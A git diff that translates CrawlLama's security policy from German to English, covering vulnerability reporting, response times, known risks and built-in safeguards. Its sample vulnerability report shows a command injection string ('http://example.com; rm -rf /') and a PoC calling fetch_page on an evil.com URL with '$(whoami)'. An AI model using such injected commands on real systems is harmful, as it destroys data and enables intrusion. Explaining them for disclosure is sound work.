@@ -1,3 +1,4 @@
+
 # Security Policy
 
 ---
@@ -6,73 +7,72 @@
 
 ---
 
-## Sicherheitsrichtlinie
+## Security Policy
 
-Die Sicherheit von CrawlLama ist uns wichtig. Wenn du eine Sicherheitslücke entdeckst, bitten wir dich, diese verantwortungsvoll zu melden.
+The security of CrawlLama is important to us. If you discover a vulnerability, please report it responsibly.
 
-## Unterstützte Versionen
+## Supported Versions
 
-Wir stellen Sicherheitsupdates für die folgenden Versionen bereit:
+We provide security updates for the following versions:
 
-| Version | Unterstützt          |
-| ------- | -------------------- |
-| 1.4.x   | :white_check_mark:   |
-| 1.3.x   | :x:   |
-| 1.2.x   | :x:                  |
-| < 1.2   | :x:                  |
+| Version | Supported          |
+| ------- | ------------------ |
+| 1.4.x   | :white_check_mark: |
+| 1.3.x   | :x:                |
+| 1.2.x   | :x:                |
+| < 1.2   | :x:                |
 
-## Sicherheitslücken melden
+## Reporting Vulnerabilities
 
-### Bitte NICHT öffentlich melden
+### Please DO NOT report publicly
 
-**Erstelle KEINE öffentlichen GitHub Issues für Sicherheitslücken.** Dies könnte andere Nutzer gefährden.
+**Do NOT create public GitHub Issues for vulnerabilities.** This could put other users at risk.
 
-### Verantwortungsvolle Offenlegung
+### Responsible Disclosure
 
-Bitte melde Sicherheitslücken verantwortungsvoll über:
+Please report vulnerabilities responsibly via:
 
-#### GitHub Security Advisory (bevorzugt)
+#### GitHub Security Advisory (preferred)
 
-1. Gehe zu [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)
-2. Klicke auf "Report a vulnerability"
-3. Fülle das Formular mit Details aus
+1. Go to [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)
+2. Click "Report a vulnerability"
+3. Fill out the form with details
 
-#### E-Mail (alternativ für sensible Leaks)
+#### Email (alternative for sensitive leaks)
 
-- **E-Mail**: [crawllama.support@protonmail.com](mailto:crawllama.support@protonmail.com)
-- **Betreff**: `[SECURITY] Kurze Beschreibung`
-- **Verschlüsselung**: Proton Mail bietet Ende-zu-Ende-Verschlüsselung
+- **Email**: [crawllama.support@protonmail.com](mailto:crawllama.support@protonmail.com)
+- **Subject**: `[SECURITY] Short Description`
+- **Encryption**: Proton Mail offers end-to-end encryption
 
-### Was sollte der Bericht enthalten?
+### What should the report include?
 
-Bitte gib so viele Details wie möglich an:
+Please provide as many details as possible:
 
-- **Art der Sicherheitslücke** (z.B. Code-Injection, XSS, Arbitrary File Read)
-- **Betroffene Version(en)**
-- **Schritte zur Reproduktion**
-- **Proof of Concept (PoC)** Code oder Screenshot
-- **Potenzielle Auswirkung** (z.B. RCE, Datenleck, DoS)
-- **Vorgeschlagene Lösung** (optional)
-- **CVE-ID** (falls bereits vorhanden)
+- **Type of vulnerability** (e.g. Code Injection, XSS, Arbitrary File Read)
+- **Affected version(s)**
+- **Steps to reproduce**
+- **Proof of Concept (PoC)** code or screenshot
+- **Potential impact** (e.g. RCE, data leak, DoS)
+- **Suggested solution** (optional)
+- **CVE-ID** (if already available)
 
-**Beispiel:**
+**Example:**
 
 ```markdown
-**Sicherheitslücke:** Command Injection in page_reader.py
+**Vulnerability:** Command Injection in page_reader.py
 
 **Version:** v1.3.0
 
-**Beschreibung:**
-Die Funktion `fetch_page()` in `tools/page_reader.py` validiert 
-User-Input nicht korrekt, was zu Command Injection führen kann.
+**Description:**
+The function `fetch_page()` in `tools/page_reader.py` does not properly validate user input, which can lead to command injection.
 
-**Schritte:**
-1. Starte CrawlLama
-2. Gebe folgende URL ein: `http://example.com; rm -rf /`
-3. Command wird auf dem System ausgeführt
+**Steps:**
+1. Start CrawlLama
+2. Enter the following URL: `http://example.com; rm -rf /`
+3. Command is executed on the system
 
-**Auswirkung:** 
-Remote Code Execution (RCE) als User, der CrawlLama ausführt
+**Impact:**
+Remote Code Execution (RCE) as the user running CrawlLama
 
 **PoC:**
 ```python
@@ -80,93 +80,93 @@ from tools.page_reader import fetch_page
 fetch_page("http://evil.com$(whoami)")
 ```
 
-**Vorschlag:**
-URL-Validierung mit `validators.url()` vor der Verarbeitung
+**Suggestion:**
+URL validation with `validators.url()` before processing
 ```
 
-### Response-Zeiten
+### Response Times
 
-Wir bemühen uns um folgende Response-Zeiten:
+We strive for the following response times:
 
-- **Erstantwort**: Innerhalb von 48 Stunden
-- **Erste Bewertung**: Innerhalb von 7 Tagen
-- **Fix für kritische Lücken**: Innerhalb von 30 Tagen
-- **Fix für moderate Lücken**: Innerhalb von 90 Tagen
+- **Initial response**: Within 48 hours
+- **First assessment**: Within 7 days
+- **Fix for critical issues**: Within 30 days
+- **Fix for moderate issues**: Within 90 days
 
-## Schweregrade
+## Severity Levels
 
-Wir verwenden das [CVSS v3.1](https://www.first.org/cvss/calculator/3.1) Scoring-System:
+We use the [CVSS v3.1](https://www.first.org/cvss/calculator/3.1) scoring system:
 
-| Schweregrad | CVSS Score | Beispiele |
-|-------------|------------|-----------|
-| **Critical** | 9.0-10.0 | RCE, Authentication Bypass |
-| **High** | 7.0-8.9 | SQL Injection, XSS |
-| **Medium** | 4.0-6.9 | CSRF, Information Disclosure |
-| **Low** | 0.1-3.9 | Minor Information Leaks |
+| Severity    | CVSS Score | Examples                  |
+|-------------|------------|---------------------------|
+| **Critical**| 9.0-10.0   | RCE, Authentication Bypass|
+| **High**    | 7.0-8.9    | SQL Injection, XSS        |
+| **Medium**  | 4.0-6.9    | CSRF, Information Disclosure|
+| **Low**     | 0.1-3.9    | Minor Information Leaks   |
 
-## Bekannte Sicherheitsrisiken
+## Known Security Risks
 
-### Lokaler Betrieb erforderlich
+### Local Operation Required
 
-CrawlLama ist für **lokalen Betrieb** konzipiert. Bei öffentlicher Exposition (z.B. über FastAPI):
+CrawlLama is designed for **local operation**. If exposed publicly (e.g. via FastAPI):
 
-⚠️ **Wichtige Sicherheitsmaßnahmen:**
+⚠️ **Important Security Measures:**
 
-1. **Authentication**: Implementiere API-Key-Authentication
-2. **Rate Limiting**: Nutze das eingebaute Rate-Limiting (`security.rate_limit`)
-3. **Input Validation**: Alle User-Inputs werden validiert
-4. **Firewall**: Exponiere API nur über Firewall/Reverse Proxy
-5. **HTTPS**: Nutze TLS für verschlüsselte Kommunikation
+1. **Authentication**: Implement API key authentication
+2. **Rate Limiting**: Use the built-in rate limiting (`security.rate_limit`)
+3. **Input Validation**: All user inputs are validated
+4. **Firewall**: Expose API only via firewall/reverse proxy
+5. **HTTPS**: Use TLS for encrypted communication
 
-### Web-Scraping Risiken
+### Web Scraping Risks
 
-- **Malicious Content**: Webseiten können schädlichen Content enthalten
-- **SSRF**: Server-Side Request Forgery durch User-kontrollierte URLs
-- **DoS**: Unendliche Weiterleitungen oder große Downloads
-
-**Mitigation:**
-- Domain-Blacklist aktiviert (`data/blacklist.txt`)
-- Timeout-Limits konfiguriert
-- Max. Response-Size limitiert
-- robots.txt wird respektiert
-
-### LLM-spezifische Risiken
-
-- **Prompt Injection**: Malicious Prompts in Suchergebnissen
-- **Data Poisoning**: Falsche Informationen in RAG-Datenbank
-- **Model Hallucination**: Generierte Fehlinformationen
+- **Malicious Content**: Websites may contain harmful content
+- **SSRF**: Server-Side Request Forgery via user-controlled URLs
+- **DoS**: Infinite redirects or large downloads
 
 **Mitigation:**
-- Hallucination Detection aktiviert (`core/hallu_detect.py`)
-- Output-Sanitization
-- Source-Attribution (Quellenangabe)
+- Domain blacklist enabled (`data/blacklist.txt`)
+- Timeout limits configured
+- Max response size limited
+- robots.txt is respected
+
+### LLM-specific Risks
+
+- **Prompt Injection**: Malicious prompts in search results
+- **Data Poisoning**: False information in RAG database
+- **Model Hallucination**: Generated misinformation
+
+**Mitigation:**
+- Hallucination detection enabled (`core/hallu_detect.py`)
+- Output sanitization
+- Source attribution
 
 ### Dependency Vulnerabilities
 
-Wir überwachen Dependencies regelmäßig:
+We monitor dependencies regularly:
 
 ```bash
-# Prüfe Dependencies
+# Check dependencies
 pip-audit
 safety check
 
-# Oder mit unserem Script
+# Or with our script
 python scripts/check_dependencies.py
 ```
 
-**Automatische Updates:** Dependabot ist aktiviert und erstellt PRs für Security-Updates.
+**Automatic updates:** Dependabot is enabled and creates PRs for security updates.
 
-## Sicherheits-Features
+## Security Features
 
-CrawlLama hat folgende eingebaute Sicherheits-Features:
+CrawlLama has the following built-in security features:
 
 ### 1. Input Validation
 
 ```python
 # utils/validators.py
-validate_url()        # URL-Format prüfen
-validate_query()      # Query-Länge/Content prüfen
-sanitize_output()     # LLM-Output bereinigen
+validate_url()        # Check URL format
+validate_query()      # Check query length/content
+sanitize_output()     # Clean LLM output
 ```
 
 ### 2. Rate Limiting
@@ -174,7 +174,7 @@ sanitize_output()     # LLM-Output bereinigen
 ```python
 # config.json
 "security": {
-  "rate_limit": 1.0,  # Requests pro Sekunde
+  "rate_limit": 1.0,  # Requests per second
   "check_robots_txt": true
 }
 ```
@@ -183,7 +183,7 @@ sanitize_output()     # LLM-Output bereinigen
 
 ```python
 # data/blacklist.txt
-# Blockiert bekannte malicious Domains
+# Blocks known malicious domains
 malware-site.com
 phishing-domain.net
 ```
@@ -191,84 +191,84 @@ phishing-domain.net
 ### 4. Secure Config
 
 ```python
-# API-Keys werden verschlüsselt gespeichert
+# API keys are stored encrypted
 from utils.secure_config import SecureConfig
 config = SecureConfig()
-config.set_key("api_key", "secret")  # Verschlüsselt
+config.set_key("api_key", "secret")  # Encrypted
 ```
 
-### 5. Sandbox für Plugins
+### 5. Plugin Sandbox
 
 ```python
-# Plugins laufen in separatem Namespace
-# Kein Zugriff auf sensible Daten
+# Plugins run in a separate namespace
+# No access to sensitive data
 ```
 
-## Sicherheits-Best-Practices
+## Security Best Practices
 
-### Für Benutzer
+### For Users
 
-1. **Keine Secrets committen**: Nutze `.env` für API-Keys
-2. **API nicht exponieren**: Nur lokaler Zugriff empfohlen
-3. **Updates installieren**: Halte CrawlLama aktuell
-4. **Vorsicht bei URLs**: Prüfe Quellen vor dem Hinzufügen
-5. **Logs überwachen**: Prüfe `logs/app.log` regelmäßig
+1. **Do not commit secrets**: Use `.env` for API keys
+2. **Do not expose API**: Local access only recommended
+3. **Install updates**: Keep CrawlLama up to date
+4. **Be careful with URLs**: Check sources before adding
+5. **Monitor logs**: Check `logs/app.log` regularly
 
-### Für Entwickler
+### For Developers
 
-1. **Input validieren**: Nutze `validators.py` für alle Inputs
-2. **Output sanitizen**: Bereinige LLM-Outputs vor der Anzeige
-3. **Secrets außerhalb des Codes**: Nie in Code, immer in `.env`
-4. **Dependencies prüfen**: `pip-audit` vor jedem Release
-5. **Tests schreiben**: Security-relevante Features testen
+1. **Validate input**: Use `validators.py` for all inputs
+2. **Sanitize output**: Clean LLM outputs before display
+3. **Keep secrets out of code**: Never in code, always in `.env`
+4. **Check dependencies**: Run `pip-audit` before every release
+5. **Write tests**: Test security-relevant features
 
-## Security-Checklist vor Release
+## Security Checklist Before Release
 
-- [ ] `pip-audit` ohne Critical/High Vulnerabilities
-- [ ] Keine Secrets in Code/Config committed
-- [ ] `.env.example` hat nur Platzhalter
-- [ ] Domain-Blacklist aktualisiert
-- [ ] Rate-Limiting aktiviert
-- [ ] Input-Validation für alle User-Inputs
-- [ ] Output-Sanitization für LLM-Responses
-- [ ] Security-Tests laufen grün
-- [ ] Dokumentation aktualisiert
+- [ ] `pip-audit` shows no critical/high vulnerabilities
+- [ ] No secrets committed in code/config
+- [ ] `.env.example` contains only placeholders
+- [ ] Domain blacklist updated
+- [ ] Rate limiting enabled
+- [ ] Input validation for all user inputs
+- [ ] Output sanitization for LLM responses
+- [ ] Security tests pass
+- [ ] Documentation updated
 
 ## Disclosure Policy
 
-Nach dem Fix einer Sicherheitslücke:
+After fixing a vulnerability:
 
-1. **Security Advisory** wird auf GitHub veröffentlicht
-2. **CVE** wird beantragt (für High/Critical)
-3. **Release Notes** erwähnen den Fix (ohne Details)
-4. **Credits** für den Reporter (falls gewünscht)
-5. **30-Tage-Wartezeit** vor Full Disclosure
+1. **Security advisory** is published on GitHub
+2. **CVE** is requested (for high/critical)
+3. **Release notes** mention the fix (without details)
+4. **Credits** for the reporter (if desired)
+5. **30-day waiting period** before full disclosure
 
 ## Hall of Fame
 
-Wir danken folgenden Security-Researchern für verantwortungsvolle Offenlegung:
+We thank the following security researchers for responsible disclosure:
 
 <!-- 
-Beispiel-Format:
+Example format:
 - **[Name]** - [Vulnerability Type] - [Month Year]
 -->
 
-*Noch keine Meldungen - sei der Erste!*
+*No reports yet - be the first!*
 
 ## Bug Bounty Program
 
-Derzeit haben wir **kein offizielles Bug Bounty Program**. 
+Currently, we have **no official bug bounty program**.
 
-Wir würdigen jedoch alle Sicherheitsmeldungen mit:
-- **Public Credits** (falls gewünscht)
-- **Erwähnung in Release Notes**
-- **Hall of Fame Eintrag**
+However, we honor all security reports with:
+- **Public credits** (if desired)
+- **Mention in release notes**
+- **Hall of Fame entry**
 
-## Kontakt
+## Contact
 
 - **GitHub Security**: [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)
 
-## Weitere Ressourcen
+## Further Resources
 
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
 - [CWE Top 25](https://cwe.mitre.org/top25/)
@@ -277,4 +277,4 @@ Wir würdigen jedoch alle Sicherheitsmeldungen mit:
 
 ---
 
-**Vielen Dank für deine Hilfe, CrawlLama sicher zu halten!** 🔒
+**Thank you for helping keep CrawlLama secure!** 🔒
